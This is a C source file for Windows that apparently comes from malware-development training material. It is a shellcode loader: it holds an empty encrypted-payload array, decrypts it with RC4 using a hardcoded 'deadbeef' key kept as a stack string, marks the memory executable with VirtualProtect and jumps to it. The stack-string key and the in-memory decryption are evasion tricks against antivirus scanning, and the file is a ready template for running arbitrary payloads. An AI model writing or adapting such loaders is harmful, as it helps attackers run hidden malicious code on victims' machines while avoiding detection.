#include <Windows.h>
#include <stdio.h>

const BYTE encrypted_payload[] = {
};

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;

void rc4Init(Rc4Context* context, const unsigned char* key, size_t length);
void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length);

typedef VOID PAYLOAD(VOID);

INT main(void) {
    PBYTE payload_buff = VirtualAlloc(NULL, sizeof(encrypted_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (payload_buff == NULL) {
		printf("VirtualAlloc failed with error code 0x%lx\n", GetLastError());
		return -1;
	}

    //key as stack string
    BYTE key[] = {'d','e','a','d','b','e','e','f'};

    Rc4Context context;

    rc4Init(&context, (const BYTE*)&key, sizeof(key));

    memset(&key, 0, sizeof(key));

    rc4Cipher(&context, encrypted_payload, payload_buff, sizeof(encrypted_payload));

    DWORD old_protections;

    if ( !VirtualProtect((PVOID)payload_buff, sizeof(encrypted_payload), PAGE_EXECUTE_READ, &old_protections) ) {
        printf("VirtualProtect failed with error code 0x%lx\n", GetLastError());
        return -2;
    }

    PAYLOAD* fn_payload = (PAYLOAD*)payload_buff;

    fn_payload();

    return 0;
}

// RC4 code copied from the module
void rc4Init(Rc4Context* context, const unsigned char* key, size_t length) {
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = (unsigned char)i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		//Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % length]) % 256;

		//Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}
}

void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			//XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			//Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}
